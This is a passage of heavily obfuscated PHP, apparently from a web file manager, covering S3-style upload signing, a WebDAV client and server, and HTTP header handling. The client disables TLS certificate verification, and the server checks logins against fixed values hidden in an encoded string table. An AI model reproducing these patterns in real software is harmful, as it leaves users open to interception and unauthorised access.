!0); $Fʧ = hash_hmac($Eƹɱ[1119], $A¹, $B, !0); $d = hash_hmac($Eƹɱ[1119], $f, $Fʧ); goto C螆; dʖ: $aҥ׺ř = array($this->accessKey, $C, $this->region, $dޒ, $A¹); $Eܾ = implode($Eƹɱ[8], $aҥ׺ř); $dɓ = array($Eƹɱ[1078] => gmdate($Eƹɱ[1077], strtotime($Eƹɱ[1112])), $Eƹɱ[1079] => array(array($Eƹɱ[1081] => $this->bucket), array($Eƹɱ[1080] => $Cܮ), array($Eƹɱ[1082], $Eƹɱ[1083], $Eƹɱ[33]), array($Eƹɱ[1082], $Eƹɱ[1113], $Eƹɱ[33]), array($Eƹɱ[1082], $Eƹɱ[1114], $Eƹɱ[33]), array($Eƹɱ[1084] => $B), array($Eƹɱ[1115] => $Eܾ), array($Eƹɱ[1116] => $cގ), array($Eƹɱ[1117] => $B˜Վ), array($Eƹɱ[1118] => $dСɾ))); goto eҿɤ; D与: $Eƹɱ =& $_SERVER[ԥ]; $Cܮ = $Eƹɱ[181]; $cގ = $Eƹɱ[1109]; goto c㳫; eޢĉ: } public function multiUploadFormData($c¨⼓, $dʶ悧 = 3600) { $Aӊٔ =& $_SERVER[ԥ]; $D = gmdate($Aӊٔ[1205]); $C = array(); $B꽈 = $this->client->getUploadId($this->bucket, $c¨⼓, $C); if (!$B꽈) { return !1; } return array($Aӊٔ[205] => $B꽈, $Aӊٔ[165] => $this->getHost() . $Aӊٔ[8] . $this->pathEncode($c¨⼓), $Aӊٔ[206] => $D, $Aӊٔ[89] => $c¨⼓); } public function multiUploadAuthData($c, $Fʌ = array()) { goto Aݓ; F: unset($Fʌ[$cڂ[89]]); if (isset($Fʌ[$cڂ[207]])) { return $this->listUploadParts($B廑, $Fʌ); } $dښڕ = array(); goto Eݺч; dܩ: $c쩢 = $cڂ[210]; $FÙ = $cڂ[8] . $this->pathEncode($B廑) . $c螕; $D➂ؿ = $this->client->__getSignatureV4($dښڕ, $f, $c쩢, $FÙ); goto D; D: if (strpos($c螕, $cڂ[209]) === 0) { if (isset($dښڕ[$cڂ[1207]])) { $D = $dښڕ[$cڂ[1207]]; } else { if (isset($D➂ؿ[$cڂ[1207]])) { $D = $D➂ؿ[$cڂ[1207]]; } else { $D = hash($cڂ[1119], $cڂ[33]); } } return array($cڂ[216] => $D➂ؿ[$cڂ[216]], $cڂ[1207] => $D, $cڂ[206] => $D➂ؿ[$cڂ[1210]]); } return $D➂ؿ[$cڂ[216]]; goto eߏ; Eݺч: if (isset($Fʌ[$cڂ[1206]])) { $dښڕ[$cڂ[1207]] = $Fʌ[$cڂ[1206]]; } $f = explode($cڂ[167], $this->getHost()); $f = array($cڂ[1208] => $f[1], $cڂ[1209] => $cڂ[33], $cڂ[195] => $cڂ[115], $cڂ[1121] => $Fʌ[$cڂ[77]]); goto dܩ; Aݓ: $cڂ =& $_SERVER[ԥ]; $c螕 = isset($Fʌ[$cڂ[156]]) ? $Fʌ[$cڂ[156]] : $cڂ[33]; $B廑 = $Fʌ[$cڂ[89]]; goto F; eߏ: } public function listUploadParts($DʳǊ, $b = array()) { goto e폖ȫ; F諈: $DÏ .= $E[1214]; $D峿 = array(); $Fɳſ = explode($E[167], $this->getHost()); goto Cƃ; Aަ: if (!$e䉲) { return !1; } $DÏ = $E[1211]; foreach ($e䉲 as $b̗) { $DÏ .= $E[1212] . "\x3c\x50\x61\162\x74\116\165\155\x62\x65\162\76{$b̗[$E[1163]]}\x3c\x2f\120\x61\x72\164\116\x75\155\142\145\x72\76\xa" . "\74\x45\124\x61\147\x3e{$b̗[$E[1164]]}\x3c\x2f\x45\124\141\147\x3e\12" . $E[1213]; } goto F諈; fׇ: $cśŤ = $this->client->__getSignatureV4($D峿, $AϘű, $C헔, $dȋ, $DÏ); return array($E[216] => $cśŤ[$E[216]], $E[206] => $cśŤ[$E[1210]], $E[218] => $e䉲, $E[1207] => $cśŤ[$E[1207]]); goto bަ; Cƃ: $AϘű = array($E[1208] => $Fɳſ[1], $E[195] => $E[115], $E[1121] => strlen($DÏ)); $C헔 = $E[208]; $dȋ = $E[8] . $this->pathEncode($DʳǊ) . $b[$E[156]]; goto fׇ; e폖ȫ: $E =& $_SERVER[ԥ]; $AƑ = str_replace($E[217], $E[33], $b[$E[156]]); $e䉲 = $this->client->listParts($this->bucket, $DʳǊ, $AƑ); goto Aަ; bަ: } public function link($dɲ䶅, $Fӯ = array()) { return parent::link($dɲ䶅, $Fӯ); } public function fileOut($fې, $fʜ = false, $fؾε = false, $C = '') { if (strstr($this->endpoint, $_SERVER[ԥ][1215])) { return parent::fileOutServer($fې, $fʜ, $fؾε, $C); } parent::fileOut($fې, $fʜ, $fؾε, $C); } public function fileOutImage($Eǧ, $c̪ = 250) { if (strstr($this->endpoint, $_SERVER[ԥ][1215])) { return parent::fileOutImageServer($Eǧ, $c̪); } parent::fileOutImage($Eǧ, $c̪); } public function fileOutLink($fҌ) { $bЛ =& $_SERVER[ԥ]; if (substr($fҌ, 0, 7) == $bЛ[1091]) { $fҌ = $bЛ[1092] . substr($fҌ, 7); } header($bЛ[152] . $fҌ); die; } public function getHost() { $Fت =& $_SERVER[ԥ]; $AӔß = str_rtrim(parent::getHost(), $Fت[8] . $this->bucket); $AӔß = explode($Fت[167], $AӔß); return $AӔß[0] . $Fت[167] . $this->bucket . $Fت[91] . $AӔß[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($b¨, $bšؒ = 0) { parent::__construct(); $this->source = $b¨; $this->sourceSize = $bšؒ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($fޑ = false) { return $this->sourceSize; } public function getContent($A = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Bç = ftell($this->source); $a = @fread($this->source, $this->sourceSize); fseek($this->source, $Bç); return $a; } } public function fileSubstr($Cޚ = false, $cҌ = 0, $C = 0) { if (!$C) { $C = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $cҌ, $C); } if ($this->sourceType == self::TYPE_FILE) { $f֋ = ftell($this->source); fseek($this->source, $f֋ + $cҌ); $D = @fread($this->source, $C); fseek($this->source, $f֋); return $D; } } public function hashMd5($A = false) { return md5($this->getContent()); } public static function hash($B̢҆, $c┚Ȃ = 0) { $A󇓣 = new PathDriverStream($B̢҆, $c┚Ȃ); return $A󇓣->hashSimple($B̢҆); } public static function md5($f, $Cꥥ = 0) { $D = new PathDriverStream($f, $Cꥥ); return $D->hashMd5($f); } } goto f; bњٓ: class HttpDavClient { public function __construct($BŠ, $dߝڊ, $eל) { $this->header = array(); $this->userName = $dߝڊ; $this->userPassowrd = $eל; } protected function makePath($a) { return $a; } protected function setHeader($f, $dьɻ = false) { if ($dьɻ === !1) { $this->header[] = $f; } else { $this->header[] = $f . $_SERVER[ԥ][865] . $dьɻ; } } public function move($e, $CĈ, $Fߴ = '') { $C󵞱 =& $_SERVER[ԥ]; $this->setHeader($C󵞱[1731], $this->makePath($CĈ)); $this->setHeader($C󵞱[1732], $C󵞱[1733]); if ($Fߴ) { $this->setHeader($C󵞱[1734], $C󵞱[910] . $Fߴ . $C󵞱[913]); } return $this->send($C󵞱[1735], $e); } public function copy($c, $b͐) { $b =& $_SERVER[ԥ]; $this->setHeader($b[1731], $this->makePath($b͐)); $this->setHeader($b[1732], $b[1733]); return $this->send($b[1736], $c); } public function mkcol($A⺅) { $cŏ =& $_SERVER[ԥ]; $this->setHeader($cŏ[1732], $cŏ[1733]); return $this->send($cŏ[1737], $A⺅); } public function delete($Eᵔ, $E醇 = '') { $Dٌ͡ =& $_SERVER[ԥ]; if ($E醇) { $this->setHeader($Dٌ͡[1734], $Dٌ͡[910] . $E醇 . $Dٌ͡[913]); } return $this->send($Dٌ͡[1226], $Eᵔ); } public function propfind($eÆ) { $eս =& $_SERVER[ԥ]; $this->setHeader($eս[1738], $eս[83]); $this->setHeader($eս[1739], $eս[1740]); $f͎ґ = $eս[1741]; return $this->send($eս[1742], $eÆ, $f͎ґ); } public function options($e) { return $this->send($_SERVER[ԥ][1743], $e); } public function get($E) { return $this->send($_SERVER[ԥ][212], $E); } public function put($E, $bО, $cޢ = '') { $eՄ̕ =& $_SERVER[ԥ]; if ($cޢ) { $this->setHeader($eՄ̕[1734], $eՄ̕[910] . $cޢ . $eՄ̕[913]); } return $this->send($eՄ̕[210], $E, $bО); } protected function send($F, $e, $a頻 = false, $cͬ = false) { goto dݽ; D: $Bϻ = curl_init($e); curl_setopt($Bϻ, CURLOPT_CUSTOMREQUEST, $F); curl_setopt($Bϻ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto e֬ό; e֬ό: curl_setopt($Bϻ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Bϻ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Bϻ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto f; E: $this->setHeader($E듙); if ($a頻) { $a頻 = $FЧҔ[1745] . $a頻; } if (!request_url_safe($e)) { return !1; } goto D; dݽ: $FЧҔ =& $_SERVER[ԥ]; $E듙 = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($FЧҔ[1744], $FЧҔ[50]); goto E; Fѱ: $this->header = array(); return $eҹ; goto d୎; f: curl_setopt($Bϻ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Bϻ, CURLOPT_SSL_VERIFYHOST, !1); $eҹ = curl_exec($Bϻ); goto Fѱ; d୎: } } class HttpDavServer { public function __construct($c֋, $dƜˢ) { $this->root = $c֋; $this->initPath($dƜˢ); $this->start(); } public function initPath($eӏз) { $D驺 =& $_SERVER[ԥ]; $B׍ˋ = rtrim($_SERVER[$D驺[1355]], $D驺[8]) . $D驺[8]; $this->urlBase = substr($B׍ˋ, 0, strpos($B׍ˋ, $eӏз) + 1); $this->urlBase = rtrim($this->urlBase, $D驺[8]) . $eӏз; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $Dø =& $_SERVER[ԥ]; $D囈כ = HttpAuth::get(); if ($D囈כ[$Dø[531]] == $Dø[1746] && $D囈כ[$Dø[882]] == $Dø[1747]) { return !0; } HttpAuth::error(); } public function start() { goto Eþ; Eþ: $Aנ =& $_SERVER[ԥ]; $this->checkUser(); $E = $Aנ[142] . HttpHeader::method(); goto Aʗ; D腗: if (!$C) { return; } self::response($C); goto Eժ; Aʗ: if (!method_exists($this, $E)) { pr($E . $Aנ[1748]); die; } $fߴ = array($Aנ[1749], $Aנ[1750]); if (!in_array($E, $fߴ) && !$this->pathExists($this->path)) { $C = array($Aנ[1015] => 404); } else { $C = $this->{$E}(); } goto D腗; Eժ: } public function pathGet($Fժ = false) { $AД =& $_SERVER[ԥ]; $fΌ = $Fժ ? $_SERVER[$AД[1751]] : $_SERVER[$AД[1355]]; $fΌ = KodIO::clear(rawurldecode($fΌ)); if (!strstr($fΌ, KodIO::clear($this->urlBase))) { return !1; } return substr($fΌ, strpos($fΌ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($A) { return file_exists($A); } public function pathMkdir($aЯۖ) { return mkdir($aЯۖ, 511, !0); } public function pathInfo($Bٿ) { return path_info($Bٿ); } public function pathList($cХ򡗐) { return path_list($cХ򡗐); } public function pathOut($d) { echo file_get_contents($d); } public function pathPut($B, $eƏ = '') { if (!$eƏ) { return file_put_contents($B, $_SERVER[ԥ][33]); } return move_path($eƏ, $B); } public function pathRemove($d) { if (is_file($d)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($d, $a铆) { return move_path($d, $a铆); } public function pathCopy($b, $D슝) { return copy_dir($b, $D슝); } public function parsePath($F) { return $F; } public function parseItem($E, $B賎) { goto AĤ; AĤ: $B쟎 =& $_SERVER[ԥ]; $b = $this->pathGet() . $B쟎[8] . $E[$B쟎[28]]; $b = $B쟎[8] . str_replace($B쟎[168], $B쟎[8], rawurlencode($b)); goto b象; b象: if ($B賎) { $b = $B쟎[8] . str_replace($B쟎[168], $B쟎[8], rawurlencode($this->pathGet())); } if (!trim($E[$B쟎[106]])) { $E[$B쟎[106]] = time(); } if (!trim($E[$B쟎[183]])) { $E[$B쟎[183]] = time(); } goto Aٵď۸; Aٵď۸: $A޲ = array($B쟎[1752] => KodIO::clear($this->urlBase . $b), $B쟎[106] => @gmdate($B쟎[1753], $E[$B쟎[106]]), $B쟎[183] => @gmdate($B쟎[1754], $E[$B쟎[183]]), $B쟎[77] => $E[$B쟎[77]] ? $E[$B쟎[77]] : 0); return $A޲; goto C; C: } public function parseItemXml($A, $cӇ) { $e =& $_SERVER[ԥ]; $dج = $this->parseItem($A, $cӇ); if ($A[$e[29]] == $e[76]) { $A = $e[1755]; $A .= $e[1756]; } else { $aّ = $A[$e[156]] ? $A[$e[156]] : get_path_ext($A[$e[28]]); $BۗտͲ = get_file_mime($aّ); $A = $e[1757]; $A .= "\74\104\x3a\147\145\x74\143\157\x6e\x74\x65\156\164\164\171\160\x65\76{$BۗտͲ}\74\57\104\72\147\145\x74\x63\x6f\x6e\164\145\x6e\x74\164\x79\160\x65\x3e"; } return "\xa\11\x9\x3c\104\72\x72\x65\163\x70\x6f\x6e\x73\145\76\12\11\x9\11\74\104\72\150\162\145\x66\76{$dج[$e[1752]]}\x3c\57\104\72\x68\x72\x65\x66\76\xa\x9\11\11\x3c\x44\x3a\x70\162\157\160\163\164\x61\x74\x3e\xa\x9\x9\11\x9\x3c\104\72\x70\x72\157\x70\x3e\xa\x9\x9\x9\11\11\x3c\x44\72\x67\145\164\x6c\141\x73\x74\155\x6f\144\151\146\151\145\144\76{$dج[$e[106]]}\x3c\57\104\72\147\x65\164\x6c\x61\x73\x74\155\x6f\x64\x69\x66\151\145\144\76\xa\11\11\11\11\x9\x3c\104\72\143\162\145\141\164\x69\x6f\156\144\141\x74\145\x3e{$dج[$e[183]]}\x3c\x2f\x44\72\143\162\x65\141\x74\151\157\156\x64\x61\164\145\x3e\12\x9\x9\11\x9\x9\74\104\72\x67\x65\x74\x63\x6f\156\x74\x65\x6e\164\x6c\145\x6e\147\x74\x68\76{$dج[$e[77]]}\x3c\x2f\x44\x3a\147\x65\x74\x63\x6f\x6e\x74\145\156\x74\x6c\x65\156\x67\x74\150\76\12\11\x9\11\x9\11{$A}\xa\11\11\11\x9\74\57\104\x3a\160\x72\157\160\76\xa\x9\x9\x9\11\x3c\104\72\x73\x74\x61\164\x75\163\76\x48\x54\x54\120\x2f\61\x2e\61\40\x32\60\x30\x20\117\113\x3c\x2f\x44\72\x73\164\141\x74\165\163\x3e\12\11\x9\11\74\57\x44\x3a\x70\162\157\160\163\x74\141\x74\76\12\11\x9\74\57\x44\x3a\x72\145\x73\x70\157\156\x73\x65\x3e"; } public function pathListMerge($f琉) { goto f؂Ì; Cж: $eŠ = array(); foreach ($f琉 as $eա => $A왫) { if (!in_array($eա, $cţ) || !is_array($A왫)) { continue; } $eŠ = array_merge($eŠ, $A왫); } foreach ($eŠ as &$dʪ) { $dʪ[$e̴[28]] = str_replace($e̴[8], $e̴[1357], $dʪ[$e̴[28]]); } goto FČ; f؂Ì: $e̴ =& $_SERVER[ԥ]; if (!$f琉) { return $f琉; } $cţ = array($e̴[73], $e̴[74], $e̴[1758]); goto Cж; FČ: return $eŠ; goto f¤Ѻ; f¤Ѻ: } public function httpPROPFIND() { goto F꾙; Aݐȅ: $D = $F[$Eמ[1759]]; if (!is_array($Eʪ˼) || $D[$Eמ[1760]] === !1) { return array($Eמ[1761] => 404, $Eמ[1762] => $Eמ[1763]); } $b˾ = $D[$Eמ[29]] == $Eמ[163] || HttpHeader::get($Eמ[1738]) == $Eמ[464]; goto Cכׇ; bꎭ: return array($Eמ[1761] => 207, $Eמ[1762] => "\x3c\104\x3a\x6d\165\154\x74\151\163\x74\x61\x74\165\163\x20\x78\155\x6c\156\163\72\104\75\42\x44\x41\126\72\42\x3e\xa{$c}\xa\74\57\x44\72\x6d\165\x6c\x74\151\163\x74\141\x74\x75\163\76"); goto a틜; F꾙: $Eמ =& $_SERVER[ԥ]; $F = $this->pathList($this->path); $Eʪ˼ = $this->pathListMerge($F); goto Aݐȅ; Cכׇ: if ($b˾) { $Eʪ˼ = array($D); } else { $D[$Eמ[28]] = $Eמ[33]; $Eʪ˼ = array_merge(array($D), $Eʪ˼); } $c = $Eמ[33]; foreach ($Eʪ˼ as $dϰ) { $c .= $this->parseItemXml($dϰ, $b˾); } goto bꎭ; a틜: } public function httpHEAD() { $eׂՉ =& $_SERVER[ԥ]; $cƆ = $this->pathInfo($this->path); if (!$cƆ || $cƆ[$eׂՉ[29]] == $eׂՉ[76]) { return array($eׂՉ[1015] => 200, $eׂՉ[1182] => array($eׂՉ[1764])); } return array($eׂՉ[1015] => 200, $eׂՉ[1182] => array($eׂՉ[1765], $eׂՉ[135], $eׂՉ[1766] . $cƆ[$eׂՉ[77]], $eׂՉ[1767] . get_file_mime($cƆ[$eׂՉ[156]]), $eׂՉ[131] . gmdate($eׂՉ[1753], $cƆ[$eׂՉ[1229]]) . $eׂՉ[1768], $eׂՉ[1769])); } public function httpOPTIONS() { $b턯 =& $_SERVER[ԥ]; return array($b턯[1015] => 200, $b턯[1182] => array($b턯[1770], $b턯[1771], $b턯[1772], $b턯[1238])); } public function httpPROPPATCH() { $Eۋ޶ =& $_SERVER[ԥ]; $A͔ = $Eۋ޶[1773] . $_SERVER[$Eۋ޶[1355]] . $Eۋ޶[1774]; return array($Eۋ޶[1761] => 207, $Eۋ޶[1762] => "\x3c\104\72\x6d\165\154\x74\x69\x73\x74\x61\x74\x75\163\x20\170\155\154\156\163\72\x44\75\42\x44\x41\x56\x3a\42\76\xa{$A͔}\12\74\57\104\72\x6d\165\154\x74\x69\x73\x74\141\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Bόܱ =& $_SERVER[ԥ]; $cެ = $this->uploadFile(); if ($cެ) { $Bĥ = 204; } else { $cެ = $Bόܱ[33]; $Bĥ = 201; } $cȚ = $this->pathPut($this->path, $cެ); if ($cȚ == !1) { $Bĥ = 404; } return array($Bόܱ[1761] => $Bĥ); } private function uploadFile() { goto f; f: $eǓ޳ =& $_SERVER[ԥ]; @mk_dir(TEMP_FILES); $B = TEMP_FILES . $eǓ޳[1775] . rand_string(32); goto e; Cϲ󃇎: while (!feof($cϭ䥽)) { fwrite($fÇ, fread($cϭ䥽, 1024 * 200)); } fclose($cϭ䥽); fclose($fÇ); goto cǡϺ; e: $fÇ = @fopen($B, $eǓ޳[1484]); $cϭ䥽 = @fopen($eǓ޳[1776], $eǓ޳[1483]); if (!$cϭ䥽 || !$fÇ) { @unlink($B); return !1; } goto Cϲ󃇎; cǡϺ: if (@filesize($B) > 0) { return $B; } @unlink($B); return !1; goto aӻ񩃞; aӻ񩃞: } public function httpMKCOL() { $F뾲 =& $_SERVER[ԥ]; if ($this->pathExists($this->path)) { return array($F뾲[1015] => 409); } $D؝焉 = $this->pathMkdir($this->path); return array($F뾲[1015] => $D؝焉 ? 201 : 403); } public function httpMOVE() { $bǑ᎞ =& $_SERVER[ԥ]; $b = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$bǑ᎞[1777]])) { $b䷲[$bǑ᎞[1778]] = $_SERVER[$bǑ᎞[1777]] == $bǑ᎞[1779]; } $f֨胤 = $this->pathMove($this->path, $b); return array($bǑ᎞[1015] => $f֨胤 ? 201 : 404); } public function httpCOPY() { $C񈎵 = $this->parsePath($this->pathGet(!0)); $Cĩä = $this->pathCopy($this->path, $C񈎵); return array($_SERVER[ԥ][1015] => $Cĩä ? 201 : 404); } public function httpDELETE() { $A = $this->pathRemove($this->path); return array($_SERVER[ԥ][1015] => $A ? 200 : 503); } public function httpLOCK() { $EӇ =& $_SERVER[ԥ]; $bڤ = md5($this->path); $d񿌈 = $EӇ[1780] . $this->xmlGet($EӇ[1781]) . $EӇ[1782] . $bڤ . $EӇ[1783]; return array($EӇ[1015] => 200, $EӇ[1182] => array($EӇ[1784] . $bڤ, $EӇ[1785]), $EӇ[1786] => $d񿌈); } public function httpUNLOCK() { return array($_SERVER[ԥ][1015] => 204); } public function xmlGet($F) { goto b۸ԭ; Bݵ: return $cׂٸ[33]; goto b; b۸ԭ: $cׂٸ =& $_SERVER[ԥ]; static $B퍻 = false; if (!$B퍻) { $cߟ = file_get_contents($cׂٸ[1787]); $B퍻 = new DOMDocument(); $B퍻->loadXML($cߟ); } goto eͥ¼; eͥ¼: $dˈ = array_shift(explode($cׂٸ[8], $F)); $Bɔ = $B퍻->getElementsByTagNameNS($cׂٸ[1788], $dˈ); if ($Bɔ) { return $Bɔ[0]->nodeValue; } goto Bݵ; b: } public static function response($eא) { goto F݅; e: if (is_string($eא[$c[1786]])) { header($c[1789]); $aۑ = $c[1790] . $c[213] . $eא[$c[1786]]; echo $aۑ; } goto a÷ں; F݅: $c =& $_SERVER[ԥ]; $eވ = is_array($eא[$c[1182]]) ? $eא[$c[1182]] : array(); $eވ[] = HttpHeader::code($eא[$c[1015]]); goto DݢՕګ; DݢՕګ: $eވ[] = $c[1728]; $eވ[] = $c[1729]; foreach ($eވ as $FצŖ) { header($FצŖ); } goto e; a÷ں: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\x48\124\x54\x50\137\110\x4f\123\124", "\x55\x73\x65\x72\x2d\x41\147\x65\156\x74" => "\110\x54\124\x50\137\125\x53\x45\x52\x5f\101\x47\x45\x4e\124", "\x43\x6f\x6e\164\x65\156\x74\55\124\x79\x70\145" => "\110\x54\124\120\x5f\103\x4f\x4e\x54\x45\116\x54\137\x54\x59\x50\105", "\x43\x6f\x6e\164\145\x6e\x74\55\x4c\145\156\x67\164\150" => "\110\124\124\x50\x5f\103\117\116\124\x45\116\x54\137\x4c\105\x4e\107\x54\110", "\104\145\x70\164\150" => "\110\124\124\120\137\x44\x45\x50\x54\110", "\x45\x78\x70\x65\143\x74" => "\110\124\x54\x50\x5f\x45\130\x50\105\x43\x54", "\111\x66\x2d\x4e\157\x6e\145\55\115\141\164\x63\150" => "\110\x54\124\120\x5f\x49\x46\137\x4e\117\116\105\137\x4d\101\124\x43\110", "\x49\x66\x2d\x4d\x61\164\143\x68" => "\110\x54\124\x50\137\x49\106\137\115\x41\124\103\110", "\111\x66\x2d\x52\x61\156\x67\145" => "\110\124\124\x50\137\x49\x46\137\x52\x41\x4e\107\105", "\x4c\141\163\x74\x2d\x4d\157\x64\x69\146\151\145\x64" => "\x48\124\x54\x50\137\x4c\x41\x53\x54\x5f\x4d\x4f\x44\111\106\x49\105\x44", "\111\146\x2d\x4d\x6f\144\151\146\x69\x65\x64\55\x53\x69\156\143\x65" => "\110\x54\x54\120\137\x49\x46\x5f\115\117\x44\x49\106\x49\x45\104\x5f\123\x49\x4e\103\x45", "\111\146\x2d\x55\156\x6d\x6f\144\151\146\151\x65\144\x2d\123\151\x6e\143\145" => "\110\x54\124\x50\x5f\111\106\137\125\116\115\117\104\111\x46\111\x45\104\x5f\123\x49\116\103\105", "\x52\141\156\147\145" => "\110\x54\x54\x50\137\x52\x41\x4e\x47\x45", "\124\151\155\x65\157\165\164" => "\110\124\x54\120\137\x54\111\x4d\x45\117\x55\124", "\x49\146" => "\x48\124\124\120\137\x49\x46", "\x4c\x6f\143\x6b\55\x54\x6f\x6b\145\156" => "\110\x54\124\120\137\114\117\x43\x4b\x5f\124\117\113\105\x4e", "\x4f\x76\145\x72\167\x72\x69\x74\x65" => "\x48\124\x54\120\137\117\126\x45\x52\x57\122\x49\124\x45", "\x44\x65\x73\x74\x69\x6e\x61\x74\151\x6f\156" => "\110\x54\124\x50\137\104\x45\123\x54\111\116\x41\x54\111\117\116", "\x52\x65\161\x75\145\x73\164\55\x49\x64" => "\x52\105\x51\x55\x45\123\124\137\x49\x44", "\x52\x65\x71\x75\145\163\164\x2d\102\157\x64\171\55\106\x69\154\145" => "\x52\x45\x51\125\105\x53\x54\x5f\102\117\104\x59\x5f\106\111\114\105", "\122\145\x64\151\162\x65\x63\164\x2d\123\x74\141\164\165\163" => "\122\105\x44\x49\122\x45\103\x54\137\123\124\101\x54\x55\x53"); public static function init() { static $C͊ = false; if ($C͊) { return; } foreach ($_SERVER as $E => $Bբ) { $E = strtoupper($E); if (!array_key_exists($E, $_SERVER)) { continue; } $_SERVER[$E] = $Bբ; } foreach (self::$_headers as $E => $bѱ) { if (!array_key_exists($E, $_SERVER)) { continue; } $_SERVER[$E] = $_SERVER[$bѱ]; $_SERVER[strtoupper($E)] = $_SERVER[$bѱ]; } } public static function get($Dܮ) { self::init(); return $_SERVER[$Dܮ] ? $_SERVER[$Dܮ] : $_SERVER[$_SERVER[ԥ][1791] . strtoupper($Dܮ)]; } public static function method() { return strtoupper(self::get($_SERVER[ԥ][150])); } public static function length() { $F̒ܯ =& $_SERVER[ԥ]; $d = self::get($F̒ܯ[1792]); if (!$d) { $d = self::get($F̒ܯ[1121]); } return $d; } public static function range() { $eÑ덿 =& $_SERVER[ԥ]; $E = self::get($eÑ덿[194]); if (!$E) { return !1; } if (!preg_match($eÑ덿[1793], $E, $Aن)) { return !1; } if ($Aن[1] === $eÑ덿[33] && $Aن[2] === $eÑ덿[33]) { return !1; } return array($Aن[1] !== $eÑ덿[33] ? $Aن[1] : null, $Aن[2] !== $eÑ덿[33] ? $Aن[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\x43\157\x6e\x74\x69\x6e\165\145", "\61\60\x31" => "\x53\167\x69\164\x63\150\x69\156\x67\40\120\162\157\x74\x6f\143\157\x6c", "\61\60\x32" => "\x50\162\x6f\143\145\163\163\x69\x6e\147", "\x31\x30\x33" => "\x45\x61\x72\154\x79\40\110\151\156\164\163", "\62\60\x30" => "\x4f\x4b", "\x32\60\61" => "\x43\162\145\141\x74\145\144", "\x32\x30\62" => "\x41\x63\143\145\x70\164\145\x64", "\62\60\x33" => "\116\157\156\x2d\101\165\x74\x68\x6f\x72\x69\164\x61\164\x69\x76\x65\x20\x49\x6e\x66\x6f\162\155\x61\x74\x69\x6f\156", "\62\x30\x34" => "\x4e\x6f\x20\103\157\x6e\x74\145\156\x74", "\62\60\x35" => "\x52\145\x73\145\164\x20\x43\157\156\x74\145\156\164", "\62\60\66" => "\120\x61\162\164\151\x61\x6c\40\103\157\x6e\164\x65\x6e\x74", "\x32\60\67" => "\x4d\x75\x6c\164\x69\x2d\x53\164\x61\x74\165\163", "\x33\60\60" => "\115\165\154\164\151\x70\x6c\145\40\103\150\x6f\151\143\145\x73", "\x33\x30\61" => "\x4d\157\166\x65\x64\40\x50\145\x72\x6d\141\x6e\x65\x6e\x74\154\171", "\63\x30\62" => "\x46\x6f\x75\x6e\144", "\x33\60\63" => "\123\x65\145\40\117\x74\150\x65\162", "\63\x30\64" => "\116\x6f\164\40\x4d\x6f\144\151\146\151\145\x64", "\x33\x30\65" => "\x55\163\x65\40\120\162\157\170\x79", "\63\60\x37" => "\124\x65\155\x70\157\162\x61\162\x79\x20\x52\145\144\x69\162\x65\143\x74", "\63\60\70" => "\x50\x65\162\155\141\x6e\x65\x6e\x74\40\x52\x65\144\x69\162\145\143\x74", "\64\60\x30" => "\102\141\x64\x20\122\x65\x71\165\x65\x73\x74", "\x34\60\61" => "\125\156\141\165\164\x68\x6f\x72\151\x7a\x65\144", "\64\x30\x32" => "\x50\x61\x79\155\145\x6e\x74\x20\122\145\161\165\x69\162\145\144", "\64\60\63" => "\106\x6f\x72\x62\151\x64\144\145\x6e", "\64\x30\64" => "\x4e\157\x74\x20\x46\157\x75\156\x64", "\x34\60\x35" => "\x4d\145\164\x68\x6f\x64\40\x4e\157\x74\x20\x41\x6c\154\157\167\x65\x64", "\64\60\66" => "\x4e\157\164\40\101\x63\143\x65\x70\164\x61\142\154\145", "\x34\x30\67" => "\x50\x72\157\170\171\x20\101\165\164\x68\x65\x6e\x74\x69\143\141\164\x69\x6f\156\40\122\145\161\x75\x69\x72\x65\x64", "\x34\x30\x38" => "\122\x65\161\165\x65\x73\x74\x20\124\151\155\145\x6f\x75\164", "\64\x30\71" => "\103\x6f\156\x66\154\x69\x63\164", "\x34\x31\x30" => "\107\x6f\156\x65", "\x34\61\61" => "\114\x65\x6e\147\164\x68\x20\x52\145\x71\x75\151\x72\x65\x64", "\64\61\62" => "\x50\162\145\143\157\x6e\x64\151\164\151\157\156\40\x46\141\x69\154\x65\x64", "\64\x31\63" => "\x52\145\x71\165\145\163\x74\40\105\156\164\151\x74\x79\40\x54\x6f\x6f\40\x4c\x61\x72\x67\x65", "\x34\61\x34" => "\x52\145\x71\x75\145\163\x74\x20\x55\x52\111\40\124\x6f\157\x20\114\141\x72\147\145", "\x34\61\65" => "\x55\x6e\163\165\x70\160\x6f\x72\164\x65\x64\40\115\145\144\151\x61\x20\x54\171\160\x65", "\64\61\x36" => "\x52\145\x71\165\145\163\164\x65\x64\40\x52\x61\x6e\x67\x65\x20\116\x6f\x74\40\123\x61\x74\151\163\x66\x69\141\x62\x6c\145", "\64\61\67" => "\x45\x78\x70\145\143\x74\x61\x74\151\157\x6e\x20\x46\x61\x69\154\145\144", "\x34\62\x32" => "\x55\x6e\160\x72\157\143\145\x73\163\141\142\154\145\x20\x45\x6e\164\151\164\171", "\x34\x32\63" => "\114\x6f\143\x6b\145\144", "\64\x32\x34" => "\106\141\x69\154\145\x64\40\104\145\160\145\156\144\145\x6e\143\x79", "\64\x32\65" => "\125\x6e\x6f\x72\x64\145\x72\145\x64\x20\103\x6f\x6c\x6c\x65\143\164\151\x6f\156", "\x34\62\66" => 